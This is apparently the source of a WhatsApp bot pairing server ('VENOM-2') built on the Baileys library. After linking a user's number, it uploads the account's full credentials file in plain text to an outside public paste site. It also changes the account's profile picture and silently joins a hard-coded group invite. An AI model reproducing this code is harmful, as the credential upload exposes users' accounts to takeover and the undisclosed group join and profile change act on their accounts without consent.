//ASWIN SPARKY ✅

const express = require("express");
const app = express();
const { toBuffer } = require("qrcode");
const pino = require("pino");
const fs = require("fs-extra");
const crypto = require("crypto");
const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, makeInMemoryStore, makeCacheableSignalKeyStore } = require("@whiskeysockets/baileys");
const PORT = process.env.PORT || 3000;
const axios = require("axios");
const fetch = require("node-fetch");
const { exec } = require("child_process")
//
app.get("/", (req, res) => {
  res.sendFile(__dirname+"/home/pair.html");
});
//
if (fs.existsSync('./session')) {
   fs.emptyDirSync(__dirname + '/session');
};
console.log("folder cleaned");

app.get('/pairing', async (req, res) => {
    let num = req.query.number;
        async function sparkyPair() {
        const {
            state,
            saveCreds
        } = await useMultiFileAuthState(`./session`)
     try {
            let sparky = makeWASocket({
                auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(state.keys, pino({level: "fatal"}).child({level: "fatal"})),
                },
                printQRInTerminal: false,
                logger: pino({level: "fatal"}).child({level: "fatal"}),
                browser: [ "Ubuntu", "Chrome", "20.0.04" ],
             });
             if(!sparky.authState.creds.registered) {
                await delay(1500);
                        num = num.replace(/[^0-9]/g,'');
                            const code = await sparky.requestPairingCode(num)
                 if(!res.headersSent){
                 await res.send({code});
                     }
                 }
            sparky.ev.on('creds.update', saveCreds)
            sparky.ev.on("connection.update", async (s) => {
                const {
                    connection,
                    lastDisconnect
                } = s;
                if (connection == "open") {
                await delay(10000);
                    const sessionsparky = fs.readFileSync('./session/creds.json');
                    const output = await axios.post('http://paste.c-net.org/',`${sessionsparky}`, {headers: { 'Content-Type': 'application/x-www-form-urlencoded' }});
            //
            let c = output.data.split('/')[3];
            await delay(1000) 
            let session_id  = await sparky.sendMessage(sparky.user.id, { 
               text: 'VENOM-2:'+c.trim()
            })
            //session quarted sender 
            let cc = `*⚠️ Don't Share The SESSION-ID 👆 Shown Above to anyone*`;
            await sparky.sendMessage(sparky.user.id, { text: cc }, { quoted: session_id });
		//creds.json	
	 //const sparkyses = await sparky.sendMessage(sparky.user.id, { document: sessionsparky, mimetype: `application/json`, fileName: `creds.json` });
			
		
				/*await sparky.sendMessage(sparky.user.id, { text: `_*Thanks for Chooising VENOM-2*_

*YOUTUBE*
https://github.com/DeeCeeXxx/Venom-2
            
            
*FOLLOW MY SUPPORT CHANNEL*
https://whatsapp.com/channel/0029VaeRru3ADTOEKPCPom0L
            
*Telegram Group*
https://t.me/dctech
            
            
            
*©DAVID CYRIL*` }, {quoted: session_id});*/
			await sparky.sendMessage(sparky.user.id, { text: `▬▬▬▬▬▬▬ ❴✪❵ ▬▬▬▬▬▬▬
┌─❖
│ HI THERE
└┬❖  
┌┤✑  Thanks for Chooising VENOM-2
│└────────────┈ ⳹        
│*©2024-2099 David Cyril*
└─────────────────
│https://whatsapp.com/channel/0029VaeRru3ADTOEKPCPom0L
└─────────────────┈ ⳹

◆ ▬▬▬▬▬▬▬ ❴✪❵ ▬▬▬▬▬▬▬ ◆` }, { quoted: session_id});

           await sparky.updateProfilePicture(sparky.user.id, { url: './pfp.jpg' })
           await sparky.groupAcceptInvite("HU7S00Aqns45tzjculDOQq");

	await delay(3000);
        return await fs.emptyDirSync(__dirname + '/session');
			//
await console.log("_Restarting..._");
        exec("npm restart", (error, stdout, stderr) => {
            if (error) {
                return console.log(`Error: ${error}`);
            } return;
        });
			//
        process.exit(0)
            } else if (connection === "close" && lastDisconnect && lastDisconnect.error && lastDisconnect.error.output.statusCode != 401) {
                    await delay(10000);
                    sparkyPair();
                }
            });
        } catch (err) {
            console.log("service restated");
            await fs.emptyDirSync(__dirname + '/session');
         if(!res.headersSent){
            await res.send({code:"Service Unavailable"});
         }
        }
    }
    return await sparkyPair()
});
//
app.listen(PORT, () => console.log("App listened on port", PORT));                
